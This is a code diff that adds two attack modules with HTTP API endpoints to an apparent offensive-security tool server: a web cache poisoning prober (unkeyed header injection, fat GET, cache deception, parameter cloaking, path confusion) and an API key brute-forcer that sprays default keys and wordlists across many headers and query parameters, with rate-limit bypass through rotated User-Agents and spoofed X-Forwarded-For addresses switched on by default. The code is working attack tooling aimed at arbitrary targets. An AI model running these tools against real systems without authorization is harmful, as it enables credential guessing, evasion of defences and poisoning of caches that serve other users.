@@ -22766,6 +22766,793 @@ def graphql_recon_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+class CachePoisoner:
+    """
+    Web cache poisoning detection: unkeyed header probing, fat GET,
+    web cache deception, HOP-by-hop, port poisoning, method override,
+    parameter cloaking, and response cache analysis.
+    """
+
+    UNKEYED_HEADERS = [
+        ("X-Forwarded-Host",    "cache-poison.internal"),
+        ("X-Host",              "cache-poison.internal"),
+        ("X-Forwarded-Server",  "cache-poison.internal"),
+        ("X-HTTP-Host-Override","cache-poison.internal"),
+        ("Forwarded",           "host=cache-poison.internal"),
+        ("X-Forwarded-For",     "127.0.0.1"),
+        ("X-Real-IP",           "127.0.0.1"),
+        ("X-Originating-IP",    "127.0.0.1"),
+        ("X-Remote-IP",         "127.0.0.1"),
+        ("X-Client-IP",         "127.0.0.1"),
+        ("X-Forwarded-Proto",   "https"),
+        ("X-Forwarded-Scheme",  "nothttps"),
+        ("X-Original-URL",      "/admin"),
+        ("X-Rewrite-URL",       "/admin"),
+        ("X-Override-URL",      "/admin"),
+        ("X-HTTP-Method-Override", "PURGE"),
+        ("X-Method-Override",   "DELETE"),
+        ("X-Forwarded-Port",    "9999"),
+        ("True-Client-IP",      "127.0.0.1"),
+        ("CF-Connecting-IP",    "127.0.0.1"),
+    ]
+
+    HOP_BY_HOP = [
+        "Connection: close, X-Cache-Poison",
+        "Transfer-Encoding: chunked",
+        "Keep-Alive: 1",
+        "TE: trailers",
+    ]
+
+    CACHE_SENSITIVE_PATHS = [
+        "/", "/index.html", "/home", "/api", "/static/main.js",
+        "/assets/app.js", "/login", "/dashboard", "/profile",
+    ]
+
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"})
+
+    # ------------------------------------------------------------------ helpers
+    def _cachebuster(self) -> str:
+        return f"cb={int(time.time() * 1000)}"
+
+    def _baseline(self, url: str) -> Optional[requests.Response]:
+        try:
+            return self.session.get(url, timeout=10, allow_redirects=True)
+        except Exception:
+            return None
+
+    def _get_cache_headers(self, resp: requests.Response) -> Dict:
+        h = resp.headers
+        return {
+            "x_cache":        h.get("X-Cache", ""),
+            "cf_cache_status":h.get("CF-Cache-Status", ""),
+            "cache_control":  h.get("Cache-Control", ""),
+            "age":            h.get("Age", ""),
+            "vary":           h.get("Vary", ""),
+            "etag":           h.get("ETag", ""),
+            "last_modified":  h.get("Last-Modified", ""),
+        }
+
+    def _is_cached(self, resp: requests.Response) -> bool:
+        xc = resp.headers.get("X-Cache", "").lower()
+        cf = resp.headers.get("CF-Cache-Status", "").lower()
+        age = resp.headers.get("Age", "0")
+        return (
+            "hit" in xc or cf == "hit"
+            or (age.isdigit() and int(age) > 0)
+        )
+
+    def _reflected_in_body(self, resp: requests.Response, marker: str) -> bool:
+        try:
+            return marker in (resp.text or "")
+        except Exception:
+            return False
+
+    # ------------------------------------------------------------------ stage 1: unkeyed headers
+    def _probe_unkeyed_headers(self, target: str) -> List[Dict]:
+        findings = []
+        parsed  = urllib.parse.urlparse(target)
+        base    = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        marker  = f"poisontest{int(time.time())}"
+
+        for header, value in self.UNKEYED_HEADERS:
+            cb  = self._cachebuster()
+            url = f"{base}?{cb}"
+            poison_value = value.replace("cache-poison.internal", f"{marker}.internal")
+
+            try:
+                r1 = self.session.get(
+                    url, headers={header: poison_value},
+                    timeout=10, allow_redirects=True
+                )
+                # Second request without the header — does the poison persist?
+                r2 = self.session.get(url, timeout=10, allow_redirects=True)
+            except Exception:
+                continue
+
+            reflected = self._reflected_in_body(r1, marker) or self._reflected_in_body(r2, marker)
+            cached    = self._is_cached(r2)
+
+            if reflected:
+                severity = "CRITICAL" if cached else "HIGH"
+                findings.append({
+                    "type":        "unkeyed_header",
+                    "severity":    severity,
+                    "header":      header,
+                    "value":       poison_value,
+                    "url":         url,
+                    "reflected":   True,
+                    "cached":      cached,
+                    "detail":      f"Header '{header}' reflected in response body",
+                    "cache_hdrs":  self._get_cache_headers(r2),
+                })
+            elif cached and r1.status_code != r2.status_code:
+                findings.append({
+                    "type":        "unkeyed_header",
+                    "severity":    "MEDIUM",
+                    "header":      header,
+                    "value":       poison_value,
+                    "url":         url,
+                    "reflected":   False,
+                    "cached":      True,
+                    "detail":      f"Header '{header}' may alter cache behaviour (status diff {r1.status_code}→{r2.status_code})",
+                    "cache_hdrs":  self._get_cache_headers(r2),
+                })
+
+        return findings
+
+    # ------------------------------------------------------------------ stage 2: fat GET
+    def _probe_fat_get(self, target: str) -> Optional[Dict]:
+        """Send body with GET request — some caches key on URL only, ignoring body."""
+        marker = f"fatget{int(time.time())}"
+        cb  = self._cachebuster()
+        url = f"{target}?{cb}"
+        try:
+            r = self.session.request(
+                "GET", url,
+                data=json.dumps({"injected": marker}),
+                headers={"Content-Type": "application/json"},
+                timeout=10,
+            )
+            if self._reflected_in_body(r, marker):
+                return {
+                    "type":     "fat_get",
+                    "severity": "HIGH",
+                    "url":      url,
+                    "detail":   "GET request body reflected in response (fat GET poisoning possible)",
+                    "marker":   marker,
+                }
+        except Exception:
+            pass
+        return None
+
+    # ------------------------------------------------------------------ stage 3: web cache deception
+    def _probe_cache_deception(self, target: str) -> List[Dict]:
+        """Append static-looking extensions to dynamic pages to trick cache into storing them."""
+        findings = []
+        parsed   = urllib.parse.urlparse(target)
+        base     = f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"
+        decoys   = [
+            "/nonexistent.css", "/nonexistent.js", "/nonexistent.png",
+            "/nonexistent.jpg", "/nonexistent.gif", "/nonexistent.ico",
+            "/nonexistent.woff", "/nonexistent.woff2",
+        ]
+        for decoy in decoys:
+            url = base + decoy
+            try:
+                r = self.session.get(url, timeout=10, allow_redirects=True)
+                if r.status_code == 200 and self._is_cached(r):
+                    cc = r.headers.get("Cache-Control", "")
+                    if "no-store" not in cc and "private" not in cc:
+                        findings.append({
+                            "type":      "web_cache_deception",
+                            "severity":  "HIGH",
+                            "url":       url,
+                            "status":    r.status_code,
+                            "detail":    f"Dynamic endpoint cached with static extension '{decoy}'",
+                            "cache_hdrs":self._get_cache_headers(r),
+                        })
+            except Exception:
+                continue
+        return findings
+
+    # ------------------------------------------------------------------ stage 4: parameter cloaking
+    def _probe_parameter_cloaking(self, target: str) -> List[Dict]:
+        """
+        Duplicate parameter smuggling: cache sees ?a=1, backend sees ?a=1&a=POISON.
+        Also tests semicolon and encoded param separators.
+        """
+        findings  = []
+        marker    = f"cloak{int(time.time())}"
+        cb        = self._cachebuster()
+        variants  = [
+            f"{target}?{cb}&param={marker}",
+            f"{target}?{cb};param={marker}",
+            f"{target}?{cb}%26param={marker}",
+            f"{target}?{cb}&utm_content={marker}",
+            f"{target}?{cb}&_={marker}",
+        ]
+        for url in variants:
+            try:
+                r = self.session.get(url, timeout=10, allow_redirects=True)
+                if self._reflected_in_body(r, marker):
+                    findings.append({
+                        "type":    "parameter_cloaking",
+                        "severity":"HIGH",
+                        "url":     url,
+                        "detail":  "Injected parameter reflected — check if cacheable",
+                        "marker":  marker,
+                    })
+            except Exception:
+                continue
+        return findings
+
+    # ------------------------------------------------------------------ stage 5: vary header analysis
+    def _analyze_vary(self, target: str) -> Dict:
+        """Inspect Vary header to understand cache key composition."""
+        result = {"vary": "", "issues": []}
+        try:
+            r = self.session.get(target, timeout=10)
+            vary = r.headers.get("Vary", "")
+            result["vary"] = vary
+            vary_lower = vary.lower()
+            if not vary:
+                result["issues"].append("No Vary header — cache may not distinguish requests by headers")
+            if "user-agent" in vary_lower:
+                result["issues"].append("Vary: User-Agent — can be abused to poison per-UA cache entries")
+            if "origin" in vary_lower:
+                result["issues"].append("Vary: Origin — CORS-related poisoning risk if Origin unkeyed elsewhere")
+            if "*" in vary:
+                result["issues"].append("Vary: * — uncacheable (not a risk but worth noting)")
+            if "accept-encoding" not in vary_lower and "accept" not in vary_lower:
+                result["issues"].append("Vary excludes Accept-Encoding — cache collision possible across clients")
+        except Exception as e:
+            result["error"] = str(e)
+        return result
+
+    # ------------------------------------------------------------------ stage 6: HOP-by-hop
+    def _probe_hop_by_hop(self, target: str) -> List[Dict]:
+        """
+        Inject hop-by-hop headers. Some caches strip them; backends may strip
+        legitimate headers named in Connection: header, causing cache to serve
+        a different (potentially sensitive) variant.
+        """
+        findings = []
+        victims  = ["Authorization", "X-CSRF-Token", "Cookie", "X-Auth-Token"]
+        for victim in victims:
+            cb  = self._cachebuster()
+            url = f"{target}?{cb}"
+            try:
+                r = self.session.get(
+                    url,
+                    headers={"Connection": f"close, {victim}"},
+                    timeout=10,
+                )
+                if r.status_code == 200 and self._is_cached(r):
+                    findings.append({
+                        "type":    "hop_by_hop",
+                        "severity":"MEDIUM",
+                        "url":     url,
+                        "header":  victim,
+                        "detail":  f"Response cached when '{victim}' listed in Connection hop-by-hop",
+                        "cache_hdrs": self._get_cache_headers(r),
+                    })
+            except Exception:
+                continue
+        return findings
+
+    # ------------------------------------------------------------------ stage 7: path confusion
+    def _probe_path_confusion(self, target: str) -> List[Dict]:
+        """Test delimiter confusion: /path;.js, /path/.., /path%2F etc."""
+        findings = []
+        parsed   = urllib.parse.urlparse(target)
+        base     = f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"
+        variants = [
+            (base + ";.js",           "semicolon+ext"),
+            (base + "/..",            "dotdot"),
+            (base + "%2F..%2F",       "encoded_slash"),
+            (base + "/./",            "dot_slash"),
+            (base + "//",             "double_slash"),
+            (base + ".json",          "json_ext"),
+            (base + "%23ignored",     "fragment_trick"),
+        ]
+        try:
+            baseline = self.session.get(target, timeout=10)
+            baseline_body = baseline.text[:500] if baseline else ""
+        except Exception:
+            return []
+
+        for url, variant_name in variants:
+            try:
+                r = self.session.get(url, timeout=10, allow_redirects=True)
+                if r.status_code == 200 and self._is_cached(r):
+                    # Different body than baseline → different cache entry
+                    if r.text[:500] != baseline_body:
+                        findings.append({
+                            "type":        "path_confusion",
+                            "severity":    "MEDIUM",
+                            "url":         url,
+                            "variant":     variant_name,
+                            "detail":      f"Path variant '{variant_name}' cached with different response body",
+                            "cache_hdrs":  self._get_cache_headers(r),
+                        })
+            except Exception:
+                continue
+        return findings
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:          str,
+        check_headers:   bool = True,
+        check_fat_get:   bool = True,
+        check_deception: bool = True,
+        check_cloaking:  bool = True,
+        check_vary:      bool = True,
+        check_hop:       bool = True,
+        check_paths:     bool = True,
+    ) -> Dict:
+        start    = time.time()
+        findings = []
+        extras   = {}
+
+        # Normalize target
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        if check_headers:
+            findings.extend(self._probe_unkeyed_headers(target))
+
+        if check_fat_get:
+            f = self._probe_fat_get(target)
+            if f:
+                findings.append(f)
+
+        if check_deception:
+            findings.extend(self._probe_cache_deception(target))
+
+        if check_cloaking:
+            findings.extend(self._probe_parameter_cloaking(target))
+
+        if check_vary:
+            extras["vary_analysis"] = self._analyze_vary(target)
+
+        if check_hop:
+            findings.extend(self._probe_hop_by_hop(target))
+
+        if check_paths:
+            findings.extend(self._probe_path_confusion(target))
+
+        # Severity counts
+        sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+        for f in findings:
+            sev_count[f.get("severity", "INFO")] = sev_count.get(f.get("severity", "INFO"), 0) + 1
+
+        return {
+            "target":          target,
+            "findings":        findings,
+            "total_findings":  len(findings),
+            "critical":        sev_count["CRITICAL"],
+            "high":            sev_count["HIGH"],
+            "medium":          sev_count["MEDIUM"],
+            "vary_analysis":   extras.get("vary_analysis", {}),
+            "duration_sec":    round(time.time() - start, 2),
+        }
+
+
+cache_poisoner = CachePoisoner()
+
+
+@app.route("/api/tools/cache/poison", methods=["POST"])
+def cache_poison_route():
+    try:
+        params = request.json or {}
+        result = cache_poisoner.run(
+            target=params.get("target", ""),
+            check_headers=bool(params.get("check_headers", True)),
+            check_fat_get=bool(params.get("check_fat_get", True)),
+            check_deception=bool(params.get("check_deception", True)),
+            check_cloaking=bool(params.get("check_cloaking", True)),
+            check_vary=bool(params.get("check_vary", True)),
+            check_hop=bool(params.get("check_hop", True)),
+            check_paths=bool(params.get("check_paths", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 cache/poison error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+class ApiKeyBruteforcer:
+    """
+    API key discovery and brute-force: header enumeration, common default
+    key testing, wordlist spraying, rate-limit detection & bypass, and
+    response-diff analysis to identify valid keys.
+    """
+
+    # Headers where API keys most commonly live
+    API_KEY_HEADERS = [
+        "X-API-Key",
+        "X-Api-Key",
+        "Api-Key",
+        "API-Key",
+        "Authorization",
+        "X-Auth-Token",
+        "X-Access-Token",
+        "X-Token",
+        "Auth-Token",
+        "X-Secret-Key",
+        "X-Application-Key",
+        "X-Client-Key",
+        "X-Service-Key",
+        "X-App-Key",
+        "X-Master-Key",
+        "X-Account-Key",
+        "X-Subscription-Key",
+        "Ocp-Apim-Subscription-Key",        # Azure API Management
+        "X-RapidAPI-Key",
+        "X-Gravitee-Api-Key",               # Gravitee
+        "X-IBM-Client-Id",                  # IBM API Connect
+        "X-Kong-Consumer",                  # Kong
+        "x-hasura-admin-secret",            # Hasura
+        "DD-API-KEY",                       # Datadog
+        "APCA-API-KEY-ID",                  # Alpaca
+    ]
+
+    # Common default / example keys developers leave in
+    DEFAULT_KEYS = [
+        "apikey", "api_key", "secret", "password", "changeme",
+        "admin", "root", "test", "demo", "example",
+        "default", "12345", "123456", "1234567890",
+        "qwerty", "letmein", "abc123", "pass123",
+        "00000000", "11111111", "aaaaaaaa", "key123",
+        "testkey", "demokey", "samplekey", "mysecret",
+        "your-api-key-here", "YOUR_API_KEY", "REPLACE_ME",
+        "sk_test_", "pk_test_", "sk_live_", "pk_live_",
+        "Bearer test", "Bearer admin", "Token test",
+        "null", "undefined", "none", "true", "false",
+    ]
+
+    # Common query param names for API keys
+    PARAM_NAMES = [
+        "api_key", "apikey", "api-key", "key", "token", "access_token",
+        "auth_token", "api_token", "secret", "app_key", "app_secret",
+        "client_id", "client_secret", "subscription_key",
+    ]
+
+    # Patterns that suggest rate-limiting
+    RATE_LIMIT_PATTERNS = [
+        "rate limit", "too many requests", "throttl", "quota",
+        "429", "slow down", "exceeded", "retry after",
+    ]
+
+    # Patterns that suggest auth success
+    AUTH_SUCCESS_PATTERNS = [
+        "welcome", "dashboard", "profile", "user", "account",
+        "token", "session", "authenticated", "authorized",
+        '"success"', '"status":"ok"', '"ok":true', '"valid":true',
+    ]
+
+    # Patterns that suggest auth failure
+    AUTH_FAIL_PATTERNS = [
+        "invalid api key", "invalid key", "unauthorized", "forbidden",
+        "authentication failed", "invalid token", "bad credentials",
+        "access denied", "permission denied", "invalid credentials",
+        "api key not found", "missing api key",
+    ]
+
+    def __init__(self):
+        self.session = requests.Session()
+
+    # ------------------------------------------------------------------ helpers
+    def _make_headers(self, header_name: str, key: str) -> Dict:
+        if header_name == "Authorization":
+            # Try both Bearer and plain
+            return {header_name: f"Bearer {key}"}
+        return {header_name: key}
+
+    def _parse_rl_wait(self, resp: requests.Response) -> int:
+        """Extract Retry-After seconds, default 5."""
+        ra = resp.headers.get("Retry-After", "")
+        if ra.isdigit():
+            return int(ra)
+        return 5
+
+    def _is_rate_limited(self, resp: requests.Response) -> bool:
+        if resp.status_code == 429:
+            return True
+        body_lower = (resp.text or "").lower()
+        return any(p in body_lower for p in self.RATE_LIMIT_PATTERNS)
+
+    def _classify_response(self, resp: requests.Response, baseline_status: int, baseline_len: int) -> str:
+        """Classify whether a response indicates a valid key."""
+        if resp.status_code in (401, 403):
+            return "invalid"
+        body_lower = (resp.text or "").lower()
+        if any(p in body_lower for p in self.AUTH_FAIL_PATTERNS):
+            return "invalid"
+        # Status improved from 401/403 → 200?
+        if baseline_status in (401, 403) and resp.status_code == 200:
+            return "valid"
+        # Body got larger (richer response)?
+        if resp.status_code == 200:
+            body_len = len(resp.text or "")
+            if any(p in body_lower for p in self.AUTH_SUCCESS_PATTERNS):
+                return "valid"
+            if body_len > baseline_len * 1.5:
+                return "potential"
+        return "unknown"
+
+    # ------------------------------------------------------------------ stage 1: baseline
+    def _get_baseline(self, target: str) -> Dict:
+        """Request without any API key to establish baseline."""
+        try:
+            r = self.session.get(target, timeout=10, allow_redirects=True)
+            return {
+                "status":  r.status_code,
+                "length":  len(r.text or ""),
+                "headers": dict(r.headers),
+                "snippet": (r.text or "")[:300],
+            }
+        except Exception as e:
+            return {"status": 0, "length": 0, "headers": {}, "snippet": "", "error": str(e)}
+
+    # ------------------------------------------------------------------ stage 2: header enumeration
+    def _enumerate_headers(self, target: str, baseline: Dict, delay: float) -> List[Dict]:
+        """
+        Try each API key header with a probe value to see which headers
+        the server recognises and responds differently to.
+        """
+        findings = []
+        probe_key = f"PROBE_{int(time.time())}"
+        baseline_status = baseline.get("status", 200)
+        baseline_len    = baseline.get("length", 0)
+
+        for header in self.API_KEY_HEADERS:
+            hdrs = self._make_headers(header, probe_key)
+            try:
+                r = self.session.get(target, headers=hdrs, timeout=10, allow_redirects=True)
+                if self._is_rate_limited(r):
+                    wait = self._parse_rl_wait(r)
+                    time.sleep(min(wait, 30))
+                    continue
+
+                status_changed = r.status_code != baseline_status
+                body_changed   = len(r.text or "") != baseline_len
+
+                if status_changed or body_changed:
+                    findings.append({
+                        "header":         header,
+                        "status_baseline": baseline_status,
+                        "status_probe":   r.status_code,
+                        "body_changed":   body_changed,
+                        "detail":         f"'{header}' header changes server response (status {baseline_status}→{r.status_code})",
+                    })
+            except Exception:
+                pass
+            time.sleep(delay)
+
+        return findings
+
+    # ------------------------------------------------------------------ stage 3: spray default keys
+    def _spray_keys(
+        self,
+        target:         str,
+        active_headers: List[str],
+        wordlist:       List[str],
+        baseline:       Dict,
+        delay:          float,
+        bypass_rl:      bool,
+    ) -> List[Dict]:
+        """Spray a list of API keys across active headers."""
+        findings   = []
+        b_status   = baseline.get("status", 200)
+        b_len      = baseline.get("length", 0)
+        rate_hits  = 0
+        max_rl     = 5  # give up after 5 consecutive rate limits
+
+        # Merge with param-based attempts
+        for key in wordlist:
+            if rate_hits >= max_rl:
+                break
+
+            for header in active_headers:
+                hdrs = self._make_headers(header, key)
+
+                # Bypass attempt: rotate User-Agent + X-Forwarded-For
+                if bypass_rl:
+                    ua_pool = [
+                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+                        "python-requests/2.28.0",
+                        "curl/7.85.0",
+                        "Go-http-client/1.1",
+                    ]
+                    hdrs["User-Agent"]       = random.choice(ua_pool)
+                    hdrs["X-Forwarded-For"]  = f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
+                    hdrs["X-Real-IP"]        = hdrs["X-Forwarded-For"]
+
+                try:
+                    r = self.session.get(target, headers=hdrs, timeout=10, allow_redirects=True)
+
+                    if self._is_rate_limited(r):
+                        rate_hits += 1
+                        wait = self._parse_rl_wait(r)
+                        if bypass_rl:
+                            time.sleep(min(wait, 10))
+                        else:
+                            time.sleep(min(wait, 30))
+                        continue
+
+                    rate_hits = 0
+                    classification = self._classify_response(r, b_status, b_len)
+
+                    if classification in ("valid", "potential"):
+                        findings.append({
+                            "key":            key,
+                            "header":         header,
+                            "status":         r.status_code,
+                            "classification": classification,
+                            "severity":       "CRITICAL" if classification == "valid" else "HIGH",
+                            "detail":         f"Key '{key}' via '{header}' → {r.status_code}",
+                            "snippet":        (r.text or "")[:200],
+                        })
+
+                except Exception:
+                    pass
+
+                time.sleep(delay)
+
+        return findings
+
+    # ------------------------------------------------------------------ stage 4: param spray
+    def _spray_params(
+        self,
+        target:    str,
+        wordlist:  List[str],
+        baseline:  Dict,
+        delay:     float,
+    ) -> List[Dict]:
+        """Try API keys as query parameters."""
+        findings = []
+        b_status = baseline.get("status", 200)
+        b_len    = baseline.get("length", 0)
+        parsed   = urllib.parse.urlparse(target)
+
+        for param in self.PARAM_NAMES:
+            for key in wordlist[:20]:  # limit param spray
+                qs  = urllib.parse.urlencode({param: key})
+                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}"
+                try:
+                    r   = self.session.get(url, timeout=10, allow_redirects=True)
+                    cls = self._classify_response(r, b_status, b_len)
+                    if cls in ("valid", "potential"):
+                        findings.append({
+                            "type":           "query_param",
+                            "param":          param,
+                            "key":            key,
+                            "status":         r.status_code,
+                            "classification": cls,
+                            "severity":       "CRITICAL" if cls == "valid" else "HIGH",
+                            "detail":         f"Key '{key}' via ?{param}= → {r.status_code}",
+                            "snippet":        (r.text or "")[:200],
+                        })
+                except Exception:
+                    pass
+                time.sleep(delay)
+
+        return findings
+
+    # ------------------------------------------------------------------ stage 5: rate-limit profiling
+    def _profile_rate_limit(self, target: str) -> Dict:
+        """Send rapid requests to characterise rate-limit behaviour."""
+        result = {
+            "detected":       False,
+            "trigger_at":     None,
+            "reset_seconds":  None,
+            "retry_after":    None,
+            "type":           None,
+        }
+        for i in range(1, 51):
+            try:
+                r = self.session.get(target, timeout=5)
+                if r.status_code == 429:
+                    result["detected"]      = True
+                    result["trigger_at"]    = i
+                    result["retry_after"]   = self._parse_rl_wait(r)
+                    result["type"]          = "HTTP 429"
+                    break
+                body_lower = (r.text or "").lower()
+                if any(p in body_lower for p in self.RATE_LIMIT_PATTERNS):
+                    result["detected"]   = True
+                    result["trigger_at"] = i
+                    result["type"]       = "body pattern"
+                    break
+            except Exception:
+                break
+        return result
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:       str,
+        headers_only: bool  = False,
+        wordlist:     Optional[List[str]] = None,
+        delay:        float = 0.3,
+        bypass_rl:    bool  = True,
+        profile_rl:   bool  = True,
+        spray_params: bool  = True,
+    ) -> Dict:
+        start = time.time()
+
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        wl = wordlist if wordlist else self.DEFAULT_KEYS
+
+        baseline     = self._get_baseline(target)
+        all_findings = []
+        rl_profile   = {}
+
+        if profile_rl:
+            rl_profile = self._profile_rate_limit(target)
+
+        # Stage 2: enumerate responsive headers
+        header_enum = self._enumerate_headers(target, baseline, delay)
+        active_headers = [h["header"] for h in header_enum] if header_enum else self.API_KEY_HEADERS[:5]
+
+        if not headers_only:
+            # Stage 3: spray keys via header
+            spray_results = self._spray_keys(target, active_headers, wl, baseline, delay, bypass_rl)
+            all_findings.extend(spray_results)
+
+            # Stage 4: spray via query param
+            if spray_params:
+                param_results = self._spray_params(target, wl, baseline, delay)
+                all_findings.extend(param_results)
+
+        sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
+        for f in all_findings:
+            sev_count[f.get("severity", "MEDIUM")] = sev_count.get(f.get("severity", "MEDIUM"), 0) + 1
+
+        return {
+            "target":            target,
+            "baseline_status":   baseline.get("status", 0),
+            "rate_limit":        rl_profile,
+            "responsive_headers":header_enum,
+            "findings":          all_findings,
+            "total_findings":    len(all_findings),
+            "critical":          sev_count["CRITICAL"],
+            "high":              sev_count["HIGH"],
+            "wordlist_size":     len(wl),
+            "duration_sec":      round(time.time() - start, 2),
+        }
+
+
+api_key_bruteforcer = ApiKeyBruteforcer()
+
+
+@app.route("/api/tools/apikey/bruteforce", methods=["POST"])
+def api_key_bruteforce_route():
+    try:
+        params   = request.json or {}
+        wordlist = params.get("wordlist")  # optional list[str]
+        result   = api_key_bruteforcer.run(
+            target=params.get("target", ""),
+            headers_only=bool(params.get("headers_only", False)),
+            wordlist=wordlist if isinstance(wordlist, list) else None,
+            delay=float(params.get("delay", 0.3)),
+            bypass_rl=bool(params.get("bypass_rl", True)),
+            profile_rl=bool(params.get("profile_rl", True)),
+            spray_params=bool(params.get("spray_params", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 apikey/bruteforce error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
